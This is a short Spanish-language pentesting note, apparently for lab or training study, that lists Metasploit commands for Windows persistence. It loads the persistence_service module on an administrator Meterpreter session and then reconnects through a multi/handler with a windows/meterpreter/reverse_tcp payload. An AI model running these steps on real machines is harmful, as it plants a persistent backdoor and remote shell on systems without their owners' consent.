# Escalación de privilegios en Windows

Tags: #Windows #PrivEsc #Meterpreter #Persistence 

## Persistencia Vía Servicios 

* [Mitre | Attack - Persistence](https://attack.mitre.org/tactics/TA0003/)
```bash 
# Persistencia consiste en tecnicas para mantener el acceso a los sistemas a pesar de el reinicio, cambio de passwd, y otras interrupciones que podrian cortar el acceso. 


# Comandos de Meterpreter siendo el usuario 'administrator'
❯ sessions <ID>                                    # Regresas a la sesión de Meterpreter que tenias 

❯ background                                       # Colocamos la sesion en segundo plano 
	❯ search persistence_service                  # Exploit para tener persistencia en Windows 
	❯ use exploit/windows/local/persistence_service           
	❯ options 
	❯ set SESSION <ID>                            # Colocamos el ID de la sesión y lo encontramos con el comando 'sessions'
	❯ set LPORT 4433                              # Colocamos un puerto nuevo que no se este ocupando 
	❯ exploit 

 
❯ sessions -k <ID>                                 # Terminas una sesión especifica
# Cuando terminemos la sesion, podemos volver a retomar la sesion anterior al momento de volver a abrir Metasploit

❯ use multi/handler                                # Usando este exploit, volvemos a tener acceso a la maquina victima 
❯ set payload windows/meterpreter/reverse_tcp
❯ options 
❯ set LHOST eth1
❯ set LPORT 4433
❯ exploit                   
```